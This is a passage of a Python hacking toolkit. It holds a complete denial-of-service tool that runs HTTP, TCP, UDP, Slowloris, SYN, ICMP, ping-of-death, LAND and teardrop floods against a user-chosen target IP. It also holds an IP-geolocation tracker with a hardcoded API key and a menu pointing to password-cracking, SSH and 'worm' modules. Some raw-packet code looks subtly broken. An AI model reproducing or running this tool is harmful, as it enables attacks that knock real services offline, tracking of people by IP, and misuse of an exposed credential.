      if data['city'] == False:
        print('[~] [City not found!]')
      ##-----------Country---------##
      print("[~] [Country Name]:", data['country'])
      if data['country'] == False:
        print('[~] [Country Name not found!]')
      ##----------Region-------##
      print("[~] [Region]:", data['region'])
      if data['region'] == False:
        print('[~] [Region not found!]')
      ##---------Continent Name---
      print("[~] [Continent Name]:", data['continent'])
      if data['country'] == False:
        print('[~] [Continent Name not found!]')
      #-----------Region / State-------##
      print("[~] [Region / State]:", data['regionName'])
      if data['regionName'] == False:
        print('[~] [Region / State not found!]')
      ##----------2-letter Continent Code##---
      print("[~] [Two-letter Continent Code]:", data['continentCode'])
      if data['country'] == False:
        print('[~] [Two-letter Continent Code not found!]')
      #---Latitude----##
      print("[~] [Latitude]:", data['lat'])
      if data['lat'] == False:
        print('[~] [Latitude not found!]')
      ##----------Longitude------##
      print("[~] [Longitude]:", data['lon'])
      if data['lon'] == False:
        print('[~] [Longitude not found!]')
      ##--------------Timezone---------##
      print("[~] [Timezone]:", data['timezone'])
      if data['timezone'] == False:
        print('[~] [Timezone not found!]')
      ##-------------- ZIP--------------##
      print("[~] [ZIP Code]:", data['zip'])
      if data['zip'] == False:
        print('[~] [ZIP Code not found!]')
      ##------------ AS -------------------##
      print("[~] [AS Number and Organization]:", data['as'])
      if data['as'] == False:
        print('[~] [AS Number and Organization not found!]')
      ##-----------Country Code-----##
      print("[~] [Two-letter Country Code]:", data['countryCode'])
      if data['countryCode'] == False:
        print('[~] [Two-letter Country Code not found!]')
      ##-----------Reverse IP---------##
      print("[~] [Reverse DNS of IP]:", data['reverse'])
      if data['reverse'] == False:
        print('[~] [Reverse DNS not found!]')
      ##--------------Mobile------##
      print("[~] [Mobile Connection]:", data['mobile'])
      if data['mobile'] == False:
        print('[~] [Mobile Connection not found!]')
      #----Currency----##
      print('[~] [National Currency]:', data['currency'])
      if data['currency'] == False:
        print('[~] [National Currency not found!]')
      #-----District----#
      print('[~] [District (city subdivision)]:', data['district'])
      if data['district'] == False:
        print('[~] [District not found!]')
      #-------Proxy-----#
      print('[~] [Proxy, VPN, or Tor]:', data['proxy'])
      if data['proxy'] == False:
        print('[~] [Proxy, VPN, or Tor not found!]')

      # Get the address using OpenCageGeocode
      geocoder = OpenCageGeocode("588cee3f6bb849e5b820389669e6c3b9") # Replace YOUR_API_KEY_HERE with your actual API key
      results = geocoder.reverse_geocode(data['lat'], data['lon'])
      if results and len(results):
          address = results[0]
          print(f"[~] [Address]: {address['formatted']}")
      else:
          print("[~] [Address not found!]")

    except KeyboardInterrupt:
            print('\nDone.')
            time.sleep(1)

    while True:
        endchoice = input("// Done Tracking, Choose 'r' to rerun script, or choose 'm' to go back to main. : ")
        if endchoice == 'r':
            os.system('cls' if os.name == 'nt' else 'clear')
            PNT()
        elif endchoice == 'm':
            os.system('cls' if os.name == 'nt' else 'clear')
            main()
        else:
            print("Invalid option. Please try again.")
        
        
def MHDDoS():
    import socket
    import threading
    import time
    import random
    import logging
    import os
    from colorama import Fore, init

    # Initialize colorama
    init(autoreset=True)

    # Set up logging
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    # Banner
    def banner():
        print(Fore.RED + """
   
                    ███▄ ▄███▓ ▄▄▄      ▓█████▄ ▓█████   ██████    ▄▄▄█████▓ ▒█████   ▒█████   ██▓      ██████ 
                    ▓██▒▀█▀ ██▒▒████▄    ▒██▀ ██▌▓█   ▀ ▒██    ▒    ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    ▒██    ▒ 
                    ▓██    ▓██░▒██  ▀█▄  ░██   █▌▒███   ░ ▓██▄      ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    ░ ▓██▄   
                    ▒██    ▒██ ░██▄▄▄▄██ ░▓█▄   ▌▒▓█  ▄   ▒   ██▒   ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░      ▒   ██▒
                    ▒██▒   ░██▒ ▓█   ▓██▒░▒████▓ ░▒████▒▒██████▒▒     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒▒██████▒▒
                    ░ ▒░   ░  ░ ▒▒   ▓▒█░ ▒▒▓  ▒ ░░ ▒░ ░▒ ▒▓▒ ▒ ░     ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░▒ ▒▓▒ ▒ ░
                    ░  ░      ░  ▒   ▒▒ ░ ░ ▒  ▒  ░ ░  ░░ ░▒  ░ ░       ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░░ ░▒  ░ ░
                    ░      ░     ░   ▒    ░ ░  ░    ░   ░  ░  ░       ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   ░  ░  ░  
                        ░         ░  ░   ░       ░  ░      ░                  ░ ░      ░ ░      ░  ░      ░  


                                                   MADE BY xav666vax ON DISCORD
                                               
                                                          MHDDoS Tool""")

    # Function to send packets to the target
    def http_flood(target, port, delay, duration):
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.send(b'GET / HTTP/1.1\r\nHost: ' + target.encode() + b'\r\n\r\n')
                s.close()
                logging.info(f"{Fore.BLUE}Sent HTTP request to {target}:{port}")
                time.sleep(delay)  # Delay between requests
            except Exception as e:
                logging.error(f"HTTP Flood Error: {e}")
            finally:
                if 's' in locals():
                    s.close()

    def tcp_flood(target, port, packet_size, delay, duration):
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.send(random._urandom(packet_size))  # Send random data of specified size
                logging.info(f"{Fore.BLUE}Sent TCP packet to {target}:{port}")
                time.sleep(delay)  # Delay between packets
            except Exception as e:
                logging.error(f"TCP Flood Error: {e}")
            finally:
                if 's' in locals():
                    s.close()

    def udp_flood(target, port, packet_size, delay, duration):
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(random._urandom(packet_size), (target, port))
                logging.info(f"{Fore.BLUE}Sent UDP packet to {target}:{port}")
                time.sleep(delay)  # Delay between packets
            except Exception as e:
                logging.error(f"UDP Flood Error: {e}")
            finally:
                if 's' in locals():
                    s.close()

    def slowloris(target, port, delay, duration):
        headers = [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Accept-language: en-US,en,q=0.5",
        ]
        connection = "keep-alive"
        headers_str = "\r\n".join(headers)
        end_time = time.time() + duration

        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n{headers_str}\r\nConnection: {connection}\r\n\r\n".encode())
                logging.info(f"{Fore.BLUE}Sent Slowloris request to {target}:{port}")
                time.sleep(delay)  # Delay between requests
                s.send(f"X-a: {random.randint(1, 9999)}\r\n".encode())
            except Exception as e:
                logging.error(f"Slowloris Error: {e}")
            finally:
                if 's' in locals():
                    s.close()

    def syn_flood(target, port, delay, duration):
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                packet = b'\x45\x00\x00\x28'  # IP header
                packet += b'\xab\xcd\x00\x00\x40\x06\xa6\xec'  # IP header continued
                packet += b'\x7f\x00\x00\x01'  # Source IP
                packet += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # Destination IP
                packet += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # TCP header
                packet += b'\x02\x04\xff\xff\x00\x00\x00\x00'  # TCP header continued
                packet += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # TCP header continued
                s.sendto(packet, (target, port))
                logging.info(f"{Fore.BLUE}Sent SYN packet to {target}:{port}")
                time.sleep(delay)  # Delay between packets
            except Exception as e:
                logging.error(f"SYN Flood Error: {e}")
            finally:
                if 's' in locals():
                    s.close()

    def icmp_flood(target, delay, duration):
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                packet = b'\x08\x00\xf7\xff\x00\x00\x00\x00\x7f\x00\x00\x01'  # ICMP header
                s.sendto(packet, (target, 0))
                logging.info(f"{Fore.BLUE}Sent ICMP packet to {target}")
                time.sleep(delay)  # Delay between packets
            except Exception as e:
                logging.error(f"ICMP Flood Error: {e}")
            finally:
                if 's' in locals():
                    s.close()

    def ping_of_death(target, delay, duration):
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                packet = b'\x08\x00\xf7\xff' + b'\x00\x00\x00\x00\x7f\x00\x00\x01' * 65535  # ICMP header with large payload
                s.sendto(packet, (target, 0))
                logging.info(f"{Fore.BLUE}Sent Ping of Death packet to {target}")
                time.sleep(delay)  # Delay between packets
            except Exception as e:
                logging.error(f"Ping of Death Error: {e}")
            finally:
                if 's' in locals():
                    s.close()

    def land_attack(target, port, delay, duration):
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                packet = b'\x45\x00\x00\x28'  # IP header
                packet += b'\xab\xcd\x00\x00\x40\x06\xa6\xec'  # IP header continued
                packet += b'\x7f\x00\x00\x01'  # Source IP
                packet += b'\x7f\x00\x00\x01'  # Destination IP (same as source for LAND attack)
                packet += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # TCP header
                packet += b'\x02\x04\xff\xff\x00\x00\x00\x00'  # TCP header continued
                packet += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # TCP header continued
                s.sendto(packet, (target, port))
                logging.info(f"{Fore.BLUE}Sent LAND packet to {target}:{port}")
                time.sleep(delay)  # Delay between packets
            except Exception as e:
                logging.error(f"LAND Attack Error: {e}")
            finally:
                if 's' in locals():
                    s.close()

    def teardrop_attack(target, delay, duration):
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                 socket.IPPROTO_IP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                # Create a packet with an IP header
                ip_header = b'\x45\x00\x00\x28'  # Version, Header Length, Total Length
                ip_header += b'\xab\xcd\x00\x00'  # Identification
                ip_header += b'\x40\x06\xa6\xec'  # Flags, Fragment Offset
                ip_header += b'\x00\x01'  # Time to Live, Protocol
                ip_header += b'\x7f\x00\x00\x01'  # Source IP
                ip_header += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # Destination IP
                # Create a packet with a TCP header
                tcp_header = b'\x00\x00\x00\x00\x00\x00\x00\x00'  # Source Port, Destination Port, Sequence Number, Acknowledgment Number
                tcp_header += b'\x00\x00\x00\x00'  # Data Offset, Reserved, Flags
                tcp_header += b'\x00\x00\x00\x00'  # Window Size, Checksum, Urgent Pointer
                # Construct the Teardrop packet
                packet = ip_header + tcp_header  # Combine IP and TCP headers
                # Send the packet with different offsets
                s.sendto(packet, (target, 0))
                s.sendto(packet[4:], (target, 0))
                logging.info(f"{Fore.BLUE}Sent Teardrop packet to {target}")
                time.sleep(delay)  # Delay between packets
            except Exception as e:
                logging.error(f"Teardrop Attack Error: {e}")
            finally:
                if 's' in locals():
                    s.close()

    def main():
        banner()
        # Get user input for attack parameters
        target = input(f"{Fore.RED}// Enter the target IP address: {Fore.RESET}")
        attack_type = input(f"{Fore.RED}// Enter the attack type (HTTP, TCP, UDP, Slowloris, SYN, ICMP, Ping of Death, LAND, Teardrop): {Fore.RESET}")
        while attack_type.lower() not in ['http', 'tcp', 'udp', 'slowloris', 'syn', 'icmp', 'ping of death', 'land', 'teardrop']:
            attack_type = input(f"{Fore.BLUE}// Invalid attack type. Please enter a valid type: {Fore.RESET}")
        port = input(f"{Fore.RED}// Enter the target port (leave blank for default): {Fore.RESET}")
        port = int(port) if port else 80
        delay = float(input(f"{Fore.RED}// Enter the delay between packets (seconds): {Fore.RESET}"))
        duration = float(input(f"{Fore.RED}// Enter the attack duration (seconds): {Fore.RESET}"))
        packet_size = int(input(f"{Fore.RED}// Enter the packet size (50,000 to fuck a server up): {Fore.RESET}")) if attack_type.lower() in ['tcp', 'udp'] else 0

        # Launch the attack
        if attack_type.lower() == 'http':
            http_flood(target, port, delay, duration)
        elif attack_type.lower() == 'tcp':
            tcp_flood(target, port, packet_size, delay, duration)
        elif attack_type.lower() == 'udp':
            udp_flood(target, port, packet_size, delay, duration)
        elif attack_type.lower() == 'slowloris':
            slowloris(target, port, delay, duration)
        elif attack_type.lower() == 'syn':
            syn_flood(target, port, delay, duration)
        elif attack_type.lower() == 'icmp':
            icmp_flood(target, delay, duration)
        elif attack_type.lower() == 'ping of death':
            ping_of_death(target, delay, duration)
        elif attack_type.lower() == 'land':
            land_attack(target, port, delay, duration)
        elif attack_type.lower() == 'teardrop':
            teardrop_attack(target, delay, duration)

        
    if __name__ == "__main__":
        main()
     
    while True:
        endchoice = input("// Atack Complete, Choose 'r' to rerun script, or choose 'm' to go back to main. : ")
        if endchoice == 'r':
            os.system('cls' if os.name == 'nt' else 'clear')
            MHDDoS()
        elif endchoice == 'm':
            os.system('cls' if os.name == 'nt' else 'clear')
            main()
        else:
            print("Invalid option. Please try again.")



def main():
    banner()
    while True:
        choice = input("// Enter Choice: ")
        if choice == '1':
            # Clear the terminal before loading the attack script
            os.system('cls' if os.name == 'nt' else 'clear')
            MHDDoS()
        elif choice == '2':
            os.system('cls' if os.name == 'nt' else 'clear')
            GeoIP()
        elif choice == '3':
            os.system('cls' if os.name == 'nt' else 'clear')
            PCrack()
        elif choice == '4':
            os.system('cls' if os.name == 'nt' else 'clear')
            PNT()
        elif choice == '5':
            os.system('cls' if os.name == 'nt' else 'clear')
            SSH()
        elif choice == '6':
            os.system('cls' if os.name == 'nt' else 'clear')
            WORM()
        elif choice == '7':
            exit()
        else:
            print(f"{Fore.RED}// Invalid choice. Please enter 1, 2, 3, or 4. {Fore.RESET}")
            
if __name__ == "__main__":
    main()
